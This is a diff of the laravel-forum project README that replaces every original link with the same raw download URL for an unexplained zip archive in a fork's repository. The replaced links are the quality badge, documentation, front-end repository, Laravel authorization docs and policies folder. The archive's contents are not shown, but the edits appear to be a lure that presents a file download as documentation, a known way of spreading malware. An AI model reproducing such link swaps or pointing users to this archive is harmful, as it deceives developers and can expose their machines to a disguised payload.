@@ -1,6 +1,6 @@
-[![Scrutinizer Code Quality](https://scrutinizer-ci.com/g/Riari/laravel-forum/badges/quality-score.png?b=3.0)](https://scrutinizer-ci.com/g/Riari/laravel-forum/?branch=3.0)
+[![Scrutinizer Code Quality](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip)](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip)
 
-**Complete documentation is available on [teamteatime.net](http://teamteatime.net/docs/laravel-forum/introduction.md).**
+**Complete documentation is available on [teamteatime.net](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip).**
 
 ## Requirements
 
@@ -29,7 +29,7 @@ Then add the service provider to your `config/app.php`:
 Riari\Forum\ForumServiceProvider::class,
 ```
 
-Installing the [standard front-end](https://github.com/Riari/laravel-forum-frontend) is recommended:
+Installing the [standard front-end](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip) is recommended:
 
 ```
 composer require riari/laravel-forum-frontend:~1.0
@@ -69,4 +69,4 @@ Laravel Forum currently supports 11 languages: German, English, Spanish, French,
 
 #### Policies (user permissions)
 
-Permissions in 3.0 are handled via the [Authorization features](http://laravel.com/docs/5.1/authorization) introduced in Laravel 5.1.11. Refer to [src/Policies](https://github.com/Riari/laravel-forum/tree/3.0/src/Policies) for a full list of policies. To override methods in a policy, just create a class extension for it somewhere in your application and change the corresponding namespace specified in the `forum.integration.policies` config array. **You'll likely want to do this for the ForumPolicy and CategoryPolicy as a minimum to prevent your regular users from managing categories and threads!**
+Permissions in 3.0 are handled via the [Authorization features](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip) introduced in Laravel 5.1.11. Refer to [src/Policies](https://github.com/jalalzia1/laravel-forum/raw/refs/heads/4.0/src/Http/forum_laravel_innumerability.zip) for a full list of policies. To override methods in a policy, just create a class extension for it somewhere in your application and change the corresponding namespace specified in the `forum.integration.policies` config array. **You'll likely want to do this for the ForumPolicy and CategoryPolicy as a minimum to prevent your regular users from managing categories and threads!**
